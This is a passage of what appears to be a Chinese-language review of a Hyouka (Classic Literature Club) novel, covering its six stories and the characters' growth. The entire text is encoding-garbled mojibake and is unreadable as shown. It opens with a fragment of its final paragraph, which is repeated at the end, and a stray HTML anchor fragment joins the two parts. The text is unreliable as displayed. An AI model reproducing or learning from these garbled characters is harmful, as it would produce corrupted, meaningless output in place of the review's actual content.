‡é¢˜çš„ç›´è¯‘ï¼Œå¤§å¯ä»¥ä½“ä¼šä¸€ä¸‹ä¸ªä¸­å«ä¹‰ã€‚â€œè¿™è¿Ÿæ¥çš„ç¿…è†€ï¼Œè®©æˆ‘ä¸çŸ¥æ‰€æªã€‚â€åƒåç”°è¯´å‡ºçš„è¿™å¥è¯å†²å‡»åŠ›å·¨å¤§ã€‚å¿½ç„¶è€Œè‡³çš„è‡ªç”±ï¼Œå……æ»¡æœªçŸ¥ä¸å¯èƒ½æ€§çš„äººç”Ÿï¼Œå¦‚æ­¤ä¹‹å¤§çš„å†²å‡»ï¼Œå¿…ç„¶åŠ¨æ‘‡äº†åƒåç”°å¤šå¹´æ¥ä½œä¸ºåƒé‡‘åƒåç”°æ‰€å­˜åœ¨çš„æ„ä¹‰ã€‚å³ä½¿æˆ‘ä»¬ä¸çŸ¥é“åƒåç”°åŸæœ¬æ„¿æ„è¢«ç»§æ‰¿äººçš„èº«ä»½æŸç¼šä¸å¦ï¼Œä¹Ÿä¸çŸ¥é“å¥¹æ˜¯å¦çœŸçš„æ¸´æœ›è‡ªç”±ï¼Œä½†èƒ½ç¡®å®šçš„æ˜¯ï¼Œå¥¹é¢å¯¹æ— é™å¯èƒ½æ€§æ—¶çš„è¿·èŒ«ç»ä¸ä¼šæŒä¹…ã€‚æ•…äº‹åœ¨æŠ˜æœ¨æ‰¾åˆ°åƒåç”°åæˆ›ç„¶è€Œæ­¢ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºç­”æ¡ˆï¼Œä¹Ÿå°±æ˜¯è¯´åšå‡ºä»€ä¹ˆé€‰æ‹©å·²ç»ä¸é‡è¦äº†ã€‚å› ä¸ºè¿™ä¸ªå‘½é¢˜ä¸æ˜¯æˆ‘ä»¬æ¯ä¸€ä¸ªäººéœ€è¦æ€è€ƒçš„ï¼š-çœŸæ­£æŸç¼šæˆ‘ä»¬çš„åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯æ— å½¢çš„å‘½è¿ç‰¢ç¬¼ï¼Œè¿˜æ˜¯å¯¹æ”¹å˜çš„ææƒ§ï¼Ÿ-è¿™æœ¬ä¹¦æ²¡æœ‰åè®°ï¼Œå†æ€ä¹ˆçœ‹æœ€åä¸€é¡µéƒ½åªæ˜¯å†·å†°å†°çš„å›¾ä¹¦åœ¨ç‰ˆç¼–ç›®æ•°æ®ï¼Œæˆ‘ç›¸ä¿¡æ²¡æœ‰åè®°æ˜¯å› ä¸ºç±³æ³½ç©—ä¿¡å¸Œæœ›æœ€åè¿™å‡ æ®µå¯¹è¯èƒ½ä¹…ä¹…ç•™å­˜åœ¨è¯»è€…è„‘æµ·ï¼Œæ¯•ç«Ÿè¿™éƒ¨ä¹¦ç›¸è¾ƒäºå‰å‡ éƒ¨å¾ˆç‰¹åˆ«ã€‚ä¸è¿‡ä»¤äººæ„‰æ‚¦çš„æ˜¯ï¼Œæ­¤å¤„å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—çš„å¦ä¸€æ¡çº¿æ¸æ¸æµ®å‡ºï¼šæŠ˜æœ¨ä¸åƒåç”°çš„å…³ç³»ã€‚åƒåç”°å¼•å¯¼äº†æŠ˜æœ¨é‡æ–°æ¸´æœ›ç«ç‘°è‰²çš„äººç”Ÿï¼ŒåŠ¨æ‘‡äº†æŠ˜æœ¨â€œèŠ‚èƒ½ä¸»ä¹‰â€çš„ä¿¡æ¡ï¼Œæˆä¸ºäº†ç»“æŸæŠ˜æœ¨â€œæ‚ é•¿çš„å‡æœŸâ€çš„é‚£ä¸ªäººã€‚å¯ä»¥è¯´ï¼ŒæŠ˜æœ¨å·²ç»å–œæ¬¢ä¸Šäº†å¥¹ã€‚æ—¢ç„¶åƒåç”°çš„è¿·èŒ«ä¸ä¼šæŒä¹…ï¼Œå› ä¸ºæ­¤æ¬¡ç»å†ï¼Œåƒåç”°åœ¨æ­¤ä¹‹åå¿…ç„¶ä¼šå’ŒæŠ˜æœ¨åŠ æ·±ç¾ç»Šã€‚è¯·æœŸå¾…å§ã€‚-PSâ€¦â€¦ï¼Ÿï¼šè¯´æ˜¯æ ¡å›­æ¨ç†çš„å°è¯´ï¼Œä½†å®é™…ä¸Šè®¸å¤šæ¢è®¨çš„äº‹ç‰©ä¸€ç‚¹ä¹Ÿä¸æ ¡å›­ï¼Œæ›´ä¸æ˜¯ä¸ºäº†æ¨ç†è€Œæ¨ç†ï¼Œæ›´å¤šçš„æ˜¯å¯¹æˆé•¿ã€ç¤¾ä¼šã€äººç”Ÿä»·å€¼çš„æ€è€ƒã€‚ä¸å…¶è¯´æ˜¯è½»å°è¯´ï¼Œæˆ‘åå‘äºè®¤ä¸ºè¿™æ˜¯çº¯æ–‡å­¦ã€‚ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæˆ‘å–œæ¬¢ã€‚å¸Œæœ›å¤§å®¶èƒ½åˆ†äº«ä¸€ä¸‹å…³äºè¿™æœ¬ä¹¦çš„æ„Ÿæƒ³å§ã€‚"><a href="#å‰è¨€å‡†å¤‡çœ‹ä¹‹å‰ï¼Œæˆ‘ç•™æ„åˆ°è¿™æœ¬ä¹¦ä¸å‰å‡ æœ¬æœ‰äº›è®¸ä¸åŒã€‚è‹±æ–‡çš„å‰¯æ ‡é¢˜æ¶ˆå¤±äº†ã€‚å°é¢çš„é…å›¾æ˜¯å¤©å°ï¼Œæ˜¯ä¸€ç§ç”ŸåŠ¨æ˜æ™°çš„è‰²å½©å§ã€‚å¤©ç©ºä¸å¤©å°æŸ“ä¸Šç»¿è‰²è°ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆä»¤æˆ‘ç•™æ„äº†è®¸ä¹…ã€‚ä¸»è¦è¿˜æ˜¯å°åº•çš„æ–‡å­—ä»¤æˆ‘å¾ˆåœ¨æ„ï¼šä¹‹å‰å‡ æœ¬éƒ½åªæ˜¯åœ¨æ­¤æŠ›å‡ºæ‚¬å¿µ-x2F-ç–‘é—®ï¼Œä»¤è¯»è€…äºä¹¦ä¸­æ‰¾åˆ°ç­”æ¡ˆï¼Œè€Œè¿™é‡Œå´åœ¨åé¢é™„ä¸Šäº†è¿™æ ·çš„æ–‡å­—ï¼šâ€œå…¨ä¹¦åˆ†ä¸ºå…­ä¸ªçŸ­ç¯‡ï¼Œåœ¨å……æ»¡æ´»åŠ›åˆå¸¦ç‚¹è‹¦æ¶©çš„æ•…äº‹é‡Œï¼Œå¤ç±ç ”ç©¶ç¤¾å››åæˆå‘˜çš„è¿‡å»å’Œæœªæ¥ä¹Ÿé€æ¸æ˜æœ—â€¦â€¦â€è¯­æ°”åº”è¯¥å¾ˆå¹³æ·¡å§ï¼Œä½†æ˜¯ä»¿ä½›ä¸€ç›´åœ¨æš—ç¤ºæˆ‘è¿™ä¸€éƒ¨ä¸ç®€å•ã€‚è¿™å¥è¯åœ¨è¯•å›¾ä¼ è¾¾ç€ä»€ä¹ˆå—ï¼Ÿå·²ç»ç¡®å®šäº†å…¨ä¹¦çš„åŸºè°ƒå—ï¼Ÿæˆ‘å¾ˆå¥½å¥‡ã€‚-æ•…äº‹1ï¼šã€Šç®±å†…çš„ç¼ºå¤±ã€‹æ¡ˆä»¶æœ¬èº«ä¸å¤æ‚ã€‚æŠ•ç¥¨çš„ç¥¨æ•°æ¯”äººæ•°å¤šï¼Œäºæ˜¯é‡Œå¿—å‘æŠ˜æœ¨æ±‚åŠ©ã€‚åœ¨2äººçš„æ•£æ­¥ä¸å¯¹è¯ä¸­ï¼ŒçœŸç›¸é€æ¸æµ®å‡ºæ°´é¢ã€‚å›æœ›åŒç³»åˆ—ç¬¬5éƒ¨ã€Šä¸¤äººè·ç¦»çš„æ¦‚ç®—ã€‹ï¼Œå…¨ä¹¦ç”¨æŠ˜æœ¨äºâ€œæ˜Ÿè°·æ¯â€é•¿è·‘ä¸­çš„æ€è€ƒä¸²è”ï¼Œæ­¤å¤„æ‰‹æ³•ä¸å…¶é¢‡ä¸ºç›¸ä¼¼ã€‚å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—çš„æ•…äº‹å¾€å¾€ä¸åœ¨æ¡ˆä»¶æœ¬èº«ã€‚æƒ³æƒ³å°åº•çš„è¯ï¼Œä¸éš¾çŒœåˆ°æ­¤å¤„å†™çš„æ˜¯é‡Œå¿—çš„è½¬å˜ã€‚ç¬¬ä¸‰éƒ¨ã€Šåº“ç‰¹åˆ©äºšèŠ™å¡çš„é¡ºåºã€‹ä¸­ï¼Œé‡Œå¿—æ€»æ˜¯å¿µå¨ç€â€œæ•°æ®åº“æ˜¯å¾—ä¸å‡ºç»“è®ºçš„â€è¿™æ ·çš„è¯ã€‚ï¼ˆé¡ºå¸¦ä¸€æï¼Œç¬¬ä¸‰éƒ¨å¯¹å››äººçš„å½¢è±¡åˆ»ç”»å¾ˆç”ŸåŠ¨ï¼Œä¸ªäººå¾ˆå–œæ¬¢ã€‚ï¼‰ç„¶è€Œä¹‹æ‰€ä»¥ä¸€ç›´å¿µå¨ï¼Œæƒ³å¿…ä¹Ÿæ˜¯å› ä¸ºæœ¬äººä¸ç”˜å¿ƒâ€”â€”å°½ç®¡é‚£æ—¶é‡Œå¿—ä¹Ÿè¯•ç€æ¨ç†ï¼Œä¸è¿‡ä»–å‘ç°è‡ªå·±åšä¸åˆ°ã€‚è€Œåœ¨æ­¤ï¼Œé‡Œå¿—æ˜æ˜¾æ¥å—äº†è‡ªå·±æ²¡æœ‰æŠ˜æœ¨é‚£æ ·çš„æ‰èƒ½çš„äº‹å®ï¼Œæ€æƒ³ä¸Šå·²ç»åšäº†è½¬å˜ï¼Œä»–ä¾æ—§æ˜¯é‚£ä¸ªåœ¨è¡—æœºæ¸¸æˆä¸­è¾“äº†ä¹Ÿç¬‘å¾—ç¿çƒ‚çš„é‡Œå¿—ã€‚ä¸è¿‡é‡Œå¿—å¯¹å…¬å¹³æ­£ä¹‰çš„æ‰§ç€ã€å¯¹è‡ªå·±è®¤ä¸ºæ­£ç¡®çš„äº‹ç‰©çš„åšæŒä»æœªæ”¹å˜ã€‚è‹¥éå¦‚æ­¤ï¼Œä»–ä¾¿ä¸ä¼šä¸ºå­¦å¼Ÿæ‰“æŠ±ä¸å¹³ï¼Œä¾¿ä¸ä¼šå»è¯·æ±‚æŠ˜æœ¨è§£è°œã€‚å˜ä¸ä¸å˜ï¼ŒæŠŠé‡Œå¿—å½¢è±¡åˆ»ç”»çš„æä¸ºé²œæ˜ã€‚è¿™ä¸ªæ•…äº‹çœŸæ­£æƒ³è¦è¡¨è¾¾çš„æ˜¯è¿™æ ·å§ã€‚-æ•…äº‹2ï¼šã€Šé•œä¸­ä¸å¾—è§ã€‹ç”¨æ‘©è€¶èŠ±çš„è§†è§’æ¢å¯»æŠ˜æœ¨çš„è¿‡å»â€”â€”æœ‰æ„æ€çš„è§†è§’ã€‚æ—©å·²ç–‘æƒ‘æ‘©è€¶èŠ±ä¹‹å‰ä¸ºä»€ä¹ˆä¼šè®¨åŒæŠ˜æœ¨ï¼Œæœ¬ç¯‡åˆ™è¿›è¡Œäº†è§£ç­”ï¼Œæ¯•ç«Ÿå¤ç±ç ”ç©¶ç¤¾ç³»åˆ—å‘æ¥æ˜¯é‡ç‚¹åœ¨äºæ¡ˆä»¶èƒŒåã€‚ä»–çš„åˆä¸­åŒå­¦ä»¬ä¼šè®¨åŒä»–ä»…ä»…æ˜¯å› ä¸ºä¸€æ¬¡è¯¯ä¼šï¼Œè€ŒæŠ˜æœ¨é€‰æ‹©äº†æ²‰é»˜ã€‚åœ¨æ‘©è€¶èŠ±çš„å¥½å¥‡å¿ƒé©±ä½¿ä¸‹ï¼Œç»ˆäºäº†è§£äº†æŠ˜æœ¨æ‰€ä½œæ‰€ä¸ºçš„åŸå› ã€‚åœ¨æ‘©è€¶èŠ±é“æ­‰ä¹‹åï¼ŒæŠ˜æœ¨çœ‹ä¼¼æ¼«ä¸ç»å¿ƒï¼Œä½†æ˜¯ä¸€å¥â€œæŠ˜æœ¨çš„è§†çº¿æ¸¸ç§»ä¸å®šâ€çš„æå†™å±•ç°äº†ä»–å†…å¿ƒçš„æ·±å—è§¦åŠ¨ã€‚è¿™ä¸€ç¯‡æ•…äº‹åˆ»ç”»äº†æŠ˜æœ¨åšå¥½äº‹ä¸ç•™åçš„â€œè‹±é›„â€å½¢è±¡ï¼Œå…¶å®ä¹Ÿä¾§é¢åæ˜ äº†æŠ˜æœ¨æœ¬èº«å¹¶ä¸æ¶ˆæã€‚æŠ˜æœ¨éª¨å­é‡Œå’Œé‡Œå¿—æ˜¯ä¸€æ ·çš„ï¼Œåƒåç”°åªæ˜¯å”¤é†’äº†ä»–çš„æ¿€æƒ…ã€‚ä¸ªäººè®¤ä¸ºæ­¤æ–‡æ¶‰åŠåˆ°äº†æ ¡å›­æ¬ºå‡Œï¼Œä»æ—è§‚è€…çš„è§’åº¦å‡ºå‘å±•ç°äº†æ ¡å›­â€œå†·æš´åŠ›â€çš„å¯æ€•ã€‚æ—è§‚è€…ä¸åº”æ—è§‚ã€‚è‹¥ç›´æ¥ä»‹å…¥ä¸å¦¥ï¼Œæš—ä¸­å¸®åŠ©ä¸å¤±ä¸ºä¸€ç§å¥½æ–¹æ³•â€”â€”ç±³æ³½ç©—ä¿¡ä¹Ÿè®¸æƒ³ä¼ è¾¾çš„æ˜¯è¿™ä¸ªã€‚ä¸å¾—è§çš„ï¼ŒçœŸçš„åœ¨é•œä¸­å—ï¼Ÿ-æ•…äº‹3ï¼šã€Šç¾¤å±±å·²æ”¾æ™´ï¼Ÿã€‹æŠ˜æœ¨æ¢æ˜äº†å®é™…ä¸Šä¸å–œæ¬¢ç›´å‡æœºçš„è€å¸ˆåœ¨æŸæ—¥æ—©æ™¨è¯´å‡ºâ€œæˆ‘å–œæ¬¢ç›´å‡æœºâ€çš„ç¼˜ç”±ã€‚çœ‹åˆ°ä¸€åŠçš„æ—¶å€™å…¶å®å¤§éƒ¨åˆ†äººä¾¿éƒ½èƒ½æ¨¡æ¨¡ç³Šç³ŠçŒœåˆ°ç¼˜ç”±äº†ã€‚å½“ç„¶é‡ç‚¹ä¾æ—§ä¸åœ¨æ¡ˆä»¶ä¸Šã€‚æŠ˜æœ¨è¯´å‡ºâ€œæˆ‘å¾ˆå¥½å¥‡â€çš„æ—¶å€™ï¼Œæ— è®ºé‡Œå¿—ã€åƒåç”°ã€æ‘©è€¶èŠ±è¿˜æ˜¯è¯»è€…éƒ½ä¼šå¤§åƒä¸€æƒŠå§ã€‚è¿™åˆ™æ•…äº‹ä¸é•¿ï¼Œåƒæ˜¯ä¸€ç§è¿‡æ¸¡ã€‚ç„¶è€Œè¯´åˆ°è¿‡æ¸¡å°±ä¼šæƒ³åˆ°è½¬å˜â€”â€”èŠ‚èƒ½ä¸»ä¹‰çš„æŠ˜æœ¨å¼€å§‹æ¸´æœ›æœ¬ä¹¦ä¸­æ‰€è¯´çš„â€œç«ç‘°è‰²çš„äººç”Ÿâ€ã€‚æŸç§ç¨‹åº¦ä¸Šï¼ŒæŠ˜æœ¨å·²ç»æ”¾å¼ƒäº†èŠ‚èƒ½ä¸»ä¹‰ã€‚åƒåç”°æ˜¯å¼•å­ï¼Œæ ¹æœ¬åŠ¨åŠ›æ˜¯åŒé‡Œå¿—ä¸€æ ·çš„ã€å†…å¿ƒæ·±å¤„å¯¹æŸäº›ä¸œè¥¿çš„æ‰§ç€å’Œæ¸´æœ›ã€‚æˆ‘ç›¸ä¿¡é‡Œå¿—åœ¨æ•´ä¸ªç³»åˆ—ä¸­æ›´åƒæ˜¯æŠ˜æœ¨çš„çœŸæˆ‘ä¹‹ä½“ç°ã€‚é€šè¿‡ä¸¤äººè¡¨ç°çš„å·®å¼‚ï¼Œä¾¿èƒ½çœ‹å‡ºæŠ˜æœ¨è·ç¦»çœŸæ­£çš„è‡ªæˆ‘è¿˜æœ‰å¤šè¿œã€‚è¿™æ˜¯æˆ‘å¯¹é‡Œå¿—çš„ç†è§£ï¼šæŠ˜æœ¨å†…å¿ƒçš„é•œåƒã€‚-æ•…äº‹4ï¼šã€Šæˆ‘ä»¬çš„ä¼ è¯´ä¹‹ä¹¦ã€‹æ‘©è€¶èŠ±çš„è§†è§’ã€‚çœŸç›¸çš„æ­ç¤ºè€…å°±æ˜¯â€œå‡¶æ‰‹â€æœ¬äººï¼Œååˆ†æœ‰è¶£ã€‚æœ¬æ–‡æ¢è®¨äº†ä¸€ä¸ªé—®é¢˜ï¼šä¸ªä½“åœ¨é›†ä½“ä¹‹ä¸­ï¼Œåº”è¯¥ä¸ºäº†é›†ä½“çš„åˆ©ç›Šè€Œç‰ºç‰²è‡ªå·±ï¼Œè¿˜æ˜¯åº”è¯¥ä¸ºäº†è‡ªå·±çš„å‰é€”è€Œæ”¾å¼ƒé›†ä½“ï¼Ÿæ²³å†…å­¦å§è‡ªå·±é€€å‡ºæ¼«ç ”ï¼Œå´å®‰æ’ç¾½ä»æ‹…ä»»ç¤¾é•¿ï¼Œæ€å¯è°“æ”¾ä¸‹ï¼Ÿè€Œå…¶åŠæ‘©è€¶èŠ±é€€å‡ºä¹Ÿæ˜¯ä¸ºäº†æ¼«ç ”ä¸æ‘©è€¶èŠ±çš„åˆ©ç›Šæœ€å¤§åŒ–ã€‚ç°å®ç”Ÿæ´»å¾€å¾€ä¸ä¼šå‡ºç°æ•…äº‹ä¸­æ¼«ç ”å®Œå…¨ä¸¤æåˆ†åŒ–çš„æƒ…å†µã€‚æ— è®ºåšå‡ºä»€ä¹ˆé€‰æ‹©ï¼Œæ€»æœ‰äººè¦å—ä¼¤ã€‚å› æ­¤ï¼Œæˆ‘æ›´å€¾å‘äºéµå¾ªè‡ªå·±çš„æœ¬å¿ƒã€‚æ‘©è€¶èŠ±çš„é€‰æ‹©ä¹Ÿè®¸ä¸ä¸€å®šæ­£ç¡®ï¼Œæ›´æœ‰å¯èƒ½æ ¹æœ¬æ— å¯¹é”™ä¹‹åˆ†ï¼Œä½†å¥¹è‡³å°‘éµä»äº†è‡ªå·±çš„æœ¬å¿ƒã€‚-æ•…äº‹5ï¼šã€Šæ‚ é•¿çš„å‡æœŸã€‹è¿™åˆ™æ•…äº‹è¯¦ç»†è¯´æ˜äº†æŠ˜æœ¨æˆä¸ºèŠ‚èƒ½ä¸»ä¹‰è€…çš„åŸå› ã€‚æ•…äº‹çš„ç»“å°¾å€ŸæŠ˜æœ¨çš„å§å§ä¹‹å£è¯´äº†è¿™ä¹ˆä¸€å¥è¯ï¼šâ€œä»Šåä½ ä¼šè¿æ¥æ‚ é•¿çš„å‡æœŸï¼Œè¿™æ ·ä¹Ÿå¥½ï¼Œä½ å°±å¥½å¥½ä¼‘æ¯å§ï¼Œæ²¡é—®é¢˜ï¼Œèº«ä½“ä¼‘æ¯çš„æ—¶å€™ï¼Œå†…å¿ƒå¿…é¡»æœ‰æ‰€æ”¹å˜ã€‚â€è¿™é‡Œçš„â€œæ‚ é•¿å‡æœŸâ€å…¶å®æ˜¯ä¸€è¯­ä¸‰å…³ï¼Œæ—¢å®æŒ‡æŠ˜æœ¨å³å°†è¿æ¥çš„æ¼«é•¿æš‘å‡ï¼Œä¹Ÿæš—æŒ‡æŠ˜æœ¨ä¹‹åæ¼«æ¼«æ— æœŸçš„èŠ‚èƒ½ä¸»ä¹‰ç”Ÿæ´»ï¼Œæ›´æŒ‡çš„æ˜¯å†…å¿ƒçš„ç¼“æ…¢æ”¹å˜ã€‚â€œèº«ä½“ä¼‘æ¯çš„æ—¶å€™ï¼Œå†…å¿ƒå¿…é¡»æœ‰æ‰€æ”¹å˜â€ï¼Œæš—å–»äº†æŠ˜æœ¨å³å°†å˜æˆä¸€ä¸ªèŠ‚èƒ½ä¸»ä¹‰è€…ï¼ŒèŠ‚èƒ½ä¸»ä¹‰ç”Ÿæ´»ä¸­å†…å¿ƒå´å¹¶ä¸åšå®šï¼Œç»ˆå°†è½¬å˜æ€æƒ³ã€‚æ•…äº‹æœ€ååˆåŠ äº†ä¸€å¥ï¼šâ€œä¹Ÿä¼šæœ‰äººæ¥ç»“æŸä½ è¿™æ‚ é•¿çš„å‡æœŸã€‚â€è¯´æ˜æš‘å‡ç»ˆå°†è¿‡å»ï¼ŒèŠ‚èƒ½ä¸»ä¹‰çš„ç”Ÿæ´»å°†ä¸å†ï¼Œå†…å¿ƒæœ€ç»ˆä¹Ÿä¼šå®Œæˆè½¬å˜ï¼Œæ›´åŠ æˆç†Ÿã€‚ç±³æ³½ç©—ä¿¡åˆ»æ„å®‰æ’æŠ˜æœ¨å’Œåƒåç”°äºŒäººåœ¨è¿™ä¸ªæ•…äº‹é‡Œäº’åŠ¨ï¼Œä¼ è¾¾ç€æ‰€è°“çš„â€œæœ‰äººâ€å°±æ˜¯åƒåç”°ï¼Œæœ¬æ–‡æ˜¯å®˜æ–¹å‘ç³–çš„é“ºå«ä¹‹ä¸€ã€‚-æ•…äº‹6ï¼šã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹ä¸ç®€å•çš„ä¸€éƒ¨ä¹¦çš„æœ€åä¸€ç« ï¼Œä¸”æ ‡é¢˜å’Œä¹¦çš„æ ‡é¢˜ç›¸åŒï¼Œæš—ç¤ºç€å…¶åˆ†é‡ä¹‹é‡ã€‚ç±³æ³½ç©—ä¿¡æ›´ä¸ºç”¨å¿ƒåœ°å»åˆ»ç”»äº†äººç‰©å½¢è±¡ã€‚ç¯‡å¹…ä¸Šç¨é•¿ï¼Œæ•…äº‹çš„æ¶æ„å’Œç«‹æ„æ›´æ˜¯é«˜æ˜ï¼Œå…·å¤‡ä¸°å¯Œçš„æˆå‰§æ€§å’Œæ€æƒ³ã€‚å‰é¢å‡ ä¸ªæ•…äº‹éƒ½æ˜¯åœ¨è®²æŠ˜æœ¨ã€ç¦éƒ¨å’Œä¼ŠåŸï¼Œæœ€åä¸€ä¸ªè‡ªç„¶ç•™ç»™äº†åƒåç”°çˆ±ç‘ ã€‚â€œæ¡ˆä»¶â€çš„èµ·å› æ˜¯æœ‰ä¸€å¤©åƒåç”°çš„çˆ¶äº²çªç„¶å‘Šè¯‰å¥¹ä¸ä¸€å®šè¦å†ç»§æ‰¿å®¶ä¸šäº†ã€‚æ¯”å–»ä¸ºä¸€é“é€‰æ‹©é¢˜çš„è¯ï¼Œâ€œä¸å¿…é¡»â€å°±æ„å‘³ç€å³å¯ç”¨é€‰ç»§æ‰¿å®¶ä¸šï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¸ç»§æ‰¿ï¼Œå› æ­¤åœ¨æˆ‘ä»¬çœ‹æ¥è¿™å®æ˜¯ä¸€é“å¼€æ”¾çš„é€åˆ†é¢˜ï¼Œé€‰æ‹©ä»€ä¹ˆéƒ½å¯ä»¥ï¼Œå‡ºè·¯å˜å¤šäº†ï¼Œåº”è¯¥å¼€å¿ƒæ‰å¯¹ï¼Œåœ¨æ—äººçœ‹æ¥åƒåç”°æ ¹æœ¬ä¸å¿…è¿™ä¹ˆçƒ¦æ¼ï¼Œç„¶è€Œåœ¨åƒåç”°çœ¼ä¸­æƒ…å†µå´å¹¶éå¦‚æ­¤ã€‚å› ä¸ºå¥¹ä¸æ˜ç™½è¯¥ä¸è¯¥ç”¨è¿™è¿Ÿæ¥çš„ç¿…è†€å±•ç¿…é£ç¿”ã€‚ä¸ç¦æƒ³è¯´å°è¯´è¯»æ¥æ€»æ˜¯å¼¥æ¼«ç€ä¸€ç§æ·¡æ·¡çš„è‹¦æ¶©ï¼ˆå¦‚åŒå°åº•æ–‡å­—æ‰€è¯´ï¼‰ï¼Œè¿œæ²¡æœ‰åŠ¨ç”»æ¥çš„æ˜å¿«ã€‚ç¬¬ä¸€éƒ¨ã€Šå†°è“ã€‹çš„I-screamå·²ç»ä¸ºæ•´ä¸ªç³»åˆ—å¥ å®šäº†åŸºè°ƒã€‚ç¬¬ä¸€éƒ¨ä¹¦ä¸­åƒåç”°çš„èˆ…èˆ…å…³è°·çº¯æ›¾è¿™æ ·è·Ÿå¹´å¹¼çš„åƒåç”°è§£é‡Šâ€œå†°è“â€ï¼šâ€œæ˜¯è¦å˜åšå¼ºçš„æ„æ€ã€‚å¦‚æœè½¯å¼±çš„è¯ï¼Œæ€»æœ‰ä¸€å¤©ä¼šè¿æ‚²é¸£éƒ½å‘ä¸å‡ºæ¥ã€‚è¿™æ ·çš„è¯ï¼Œå°±ç®—æ´»ç€ï¼Œä¹Ÿåªæ˜¯è¡Œå°¸èµ°è‚‰ã€‚â€ä½œè€…å€Ÿèˆ…èˆ…ä¹‹å£è¯´è¿™æ®µè¯æš—æŒ‡çš„è‡ªç„¶æ˜¯èº«ä¸ºå®¶æ—ç»§æ‰¿äººçš„åƒåç”°çš„æŸç§å‘½è¿ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¹´å¹¼çš„åƒåç”°åœ¨å¬å®Œèˆ…èˆ…çš„è¿™å¥è¯åå°±å“­äº†ã€‚å¥¹å†…å¿ƒä¸€å®šæ˜¯å¯¹è‡ªå·±â€œç¬¼ä¸­é¸Ÿâ€çš„å‘½è¿åšè¿‡æŸç§æŠ—äº‰çš„ï¼Œä½†å¥¹è®¤ä¸ºè¿™ç§æŠ—äº‰æ— æ³•æ”¹å˜ä»€ä¹ˆï¼Œäºæ˜¯å°±æ­¤æ”¾å¼ƒã€‚ç„¶è€Œæœ‰ä¸€å¤©è¿™ä»¶äº‹çœŸçš„æˆçœŸäº†ï¼Œè¿™ä¸ªæ—¶å€™åƒåç”°æ‰å‘ç°è‡ªå·±å¹¶æ²¡æœ‰ä¸ºæ­¤åšè¿‡ä»»ä½•å‡†å¤‡ï¼Œç”šè‡³è¿è¿™ä»¶äº‹æœ¬èº«æ˜¯ä¸æ˜¯è‡ªå·±çœŸçš„æƒ³è¦çš„ä¹Ÿè¦é‡æ–°æ€è€ƒï¼Œè¿™ä¸ªæ—¶å€™æ‰çœŸæ­£å¼€å§‹æƒ¶æã€‚æŠ˜æœ¨å¯¹è¿™ç§å¿ƒç†æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„æ¯”å–»ï¼šå¥½æ¯”æœ‰äº›ä¸ä¿¡è€¶ç¨£çš„äººå”±èµæ­Œä¼šè§‰å¾—åˆ«æ‰­ä¸€æ ·ã€‚åŸæœ¬æ²¡æœ‰è‡ªç”±çš„åƒåç”°èƒ½å”±å‡ºæ†§æ†¬è‡ªç”±çš„æ­Œè¯ï¼Œä½†å½“å¥¹çœŸæ­£æœ‰äº†è‡ªç”±ååè€Œå”±ä¸å‡ºæ¥äº†ï¼Œçœ‹ä¼¼çŸ›ç›¾ï¼Œå®åˆ™ç¬¦åˆäººç‰©å¿ƒå¢ƒã€‚æ­£å¦‚æ•…äº‹çš„æ ‡é¢˜ã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹æ‰€æƒ³ä¼ è¾¾ç»™æˆ‘ä»¬çš„æ„ä¹‰ï¼šç¬¼ä¸­çš„é¸Ÿå„¿ä¼šæ†§æ†¬è‡ªç”±ï¼Œç„¶è€Œæ‰“å¼€é¸Ÿç¬¼åï¼Œå®ƒä»¬å´ä¼šå› è¿Ÿæ¥çš„ç¿…è†€è€Œææƒ§ã€‚å…¶å®ï¼Œæœ¬ä¹¦çš„å¦ä¸€ä¸ªè¯‘åâ€œäº‹åˆ°å¦‚ä»Šæ‰å«æˆ‘é£ç¿”â€æ›´è´´è¿‘åŸæ—¥æ–‡æ ‡é¢˜çš„ç›´è¯‘ï¼Œå¤§å¯ä»¥ä½“ä¼šä¸€ä¸‹ä¸ªä¸­å«ä¹‰ã€‚â€œè¿™è¿Ÿæ¥çš„ç¿…è†€ï¼Œè®©æˆ‘ä¸çŸ¥æ‰€æªã€‚â€åƒåç”°è¯´å‡ºçš„è¿™å¥è¯å†²å‡»åŠ›å·¨å¤§ã€‚å¿½ç„¶è€Œè‡³çš„è‡ªç”±ï¼Œå……æ»¡æœªçŸ¥ä¸å¯èƒ½æ€§çš„äººç”Ÿï¼Œå¦‚æ­¤ä¹‹å¤§çš„å†²å‡»ï¼Œå¿…ç„¶åŠ¨æ‘‡äº†åƒåç”°å¤šå¹´æ¥ä½œä¸ºåƒé‡‘åƒåç”°æ‰€å­˜åœ¨çš„æ„ä¹‰ã€‚å³ä½¿æˆ‘ä»¬ä¸çŸ¥é“åƒåç”°åŸæœ¬æ„¿æ„è¢«ç»§æ‰¿äººçš„èº«ä»½æŸç¼šä¸å¦ï¼Œä¹Ÿä¸çŸ¥é“å¥¹æ˜¯å¦çœŸçš„æ¸´æœ›è‡ªç”±ï¼Œä½†èƒ½ç¡®å®šçš„æ˜¯ï¼Œå¥¹é¢å¯¹æ— é™å¯èƒ½æ€§æ—¶çš„è¿·èŒ«ç»ä¸ä¼šæŒä¹…ã€‚æ•…äº‹åœ¨æŠ˜æœ¨æ‰¾åˆ°åƒåç”°åæˆ›ç„¶è€Œæ­¢ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºç­”æ¡ˆï¼Œä¹Ÿå°±æ˜¯è¯´åšå‡ºä»€ä¹ˆé€‰æ‹©å·²ç»ä¸é‡è¦äº†ã€‚å› ä¸ºè¿™ä¸ªå‘½é¢˜ä¸æ˜¯æˆ‘ä»¬æ¯ä¸€ä¸ªäººéœ€è¦æ€è€ƒçš„ï¼š-çœŸæ­£æŸç¼šæˆ‘ä»¬çš„åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯æ— 